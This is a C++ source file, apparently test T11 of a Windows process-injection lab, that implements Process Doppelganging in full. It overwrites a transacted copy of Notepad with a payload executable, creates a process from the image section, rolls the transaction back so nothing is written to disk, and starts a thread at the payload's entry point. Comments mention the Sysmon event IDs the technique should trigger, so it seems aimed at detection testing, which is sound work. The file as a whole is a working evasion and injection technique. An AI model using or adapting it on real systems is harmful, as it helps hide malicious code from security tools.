#include "common.h"
#include <ktmw32.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    ULONG JobMemberLevel
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

int main() {
    wprintf(L"[*] T11 — Process Doppelganging\n\n");

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    auto NtCreateSection    = (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    auto NtCreateProcessEx  = (pNtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
    auto NtCreateThreadEx   = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    auto NtQueryInfoProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");

    if (!NtCreateSection || !NtCreateProcessEx ||
        !NtCreateThreadEx || !NtQueryInfoProcess) {
        wprintf(L"[-] Failed to resolve NT functions\n");
        return 1;
    }
    wprintf(L"[+] NT functions resolved\n");

    // Step 1 — create TxF transaction
    HANDLE hTransaction = CreateTransaction(
        NULL, NULL, 0, 0, 0, 0, NULL
    );
    if (hTransaction == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] CreateTransaction failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Transaction created: 0x%p\n", hTransaction);
    
    // Copy-Item "C:\Windows\System32\notepad.exe" "C:\Temp\legit_Notepad.exe"
    // Step 2 — open target file transacted, copy of Notepad.exe
    wchar_t targetPath[] = L"C:\\Temp\\legit_Notepad.exe";
    HANDLE hFile = CreateFileTransactedW(
        targetPath,
        GENERIC_WRITE | GENERIC_READ,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL, hTransaction,
        NULL, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] CreateFileTransacted failed: %lu\n", GetLastError());
        RollbackTransaction(hTransaction);
        return 1;
    }
    wprintf(L"[+] Transacted file handle: 0x%p\n", hFile);

    // Step 3 — read payload PE from disk
    HANDLE hPayload = CreateFileW(
        L"C:\\Users\\jens\\Documents\\procInj\\doppel.exe",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (hPayload == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Failed to open doppel.exe: %lu\n", GetLastError());
        RollbackTransaction(hTransaction);
        return 1;
    }

    DWORD payloadSize = GetFileSize(hPayload, NULL);
    PBYTE payloadBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    DWORD bytesRead = 0;
    ReadFile(hPayload, payloadBuffer, payloadSize, &bytesRead, NULL);
    CloseHandle(hPayload);
    wprintf(L"[+] Payload PE loaded: %lu bytes\n", payloadSize);

    // Write PE to transacted file
    DWORD fileWritten = 0;
    WriteFile(hFile, payloadBuffer, payloadSize, &fileWritten, NULL);
    HeapFree(GetProcessHeap(), 0, payloadBuffer);
    wprintf(L"[+] PE written to transacted file: %lu bytes\n", fileWritten);

    // Step 4 — create section from transacted file
    HANDLE hSection = NULL;
    NTSTATUS st = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL, NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    wprintf(L"[+] NtCreateSection: 0x%08X\n", st);
    CloseHandle(hFile);

    if (st != 0) {
        wprintf(L"[-] NtCreateSection failed: 0x%08X\n", st);
        RollbackTransaction(hTransaction);
        return 1;
    }

    // Step 5 — create process from section
    HANDLE hProcess = NULL;
    st = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        0x4,
        hSection,
        NULL, NULL, 0
    );
    wprintf(L"[+] NtCreateProcessEx: 0x%08X handle: 0x%p\n", st, hProcess);

    // Step 6 — rollback transaction — file never on disk
    RollbackTransaction(hTransaction);
    CloseHandle(hTransaction);
    wprintf(L"[+] Transaction rolled back — no file committed to disk\n");

    if (st != 0 || !hProcess) {
        wprintf(L"[-] Process creation failed\n");
        return 1;
    }

    // Step 7 — get entry point from PEB
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG retLen = 0;
    NtQueryInfoProcess(hProcess, ProcessBasicInformation,
                       &pbi, sizeof(pbi), &retLen);

    PVOID imageBase = NULL;
    ReadProcessMemory(hProcess,
        (PBYTE)pbi.PebBaseAddress + 0x10,
        &imageBase, sizeof(PVOID), NULL);
    wprintf(L"[+] Process image base: 0x%p\n", imageBase);

    BYTE headers[0x1000] = {};
    ReadProcessMemory(hProcess, imageBase, headers, sizeof(headers), NULL);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)headers;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(headers + dos->e_lfanew);
    LPVOID ep = (LPVOID)((ULONG_PTR)imageBase +
                          nt->OptionalHeader.AddressOfEntryPoint);
    wprintf(L"[+] Entry point: 0x%p\n", ep);

    // Step 8 — create thread — EID 8 fires here
    HANDLE hThread = NULL;
    st = NtCreateThreadEx(
        &hThread,
        GENERIC_EXECUTE,
        NULL, hProcess,
        ep, NULL,
        0, 0, 0, 0, NULL
    );
    wprintf(L"[+] NtCreateThreadEx: 0x%08X\n", st);

    if (!hThread) {
        wprintf(L"[-] Thread creation failed\n");
        return 1;
    }

    wprintf(L"[+] Process Doppelganging complete\n");
    wprintf(L"[*] EID 25 may show Type: Image is replaced\n");
    wprintf(L"[*] EID 1 should show process spawned\n");
    wprintf(L"[*] Transaction rolled back — no file on disk\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hSection);
    CloseHandle(hProcess);
    return 0;
}
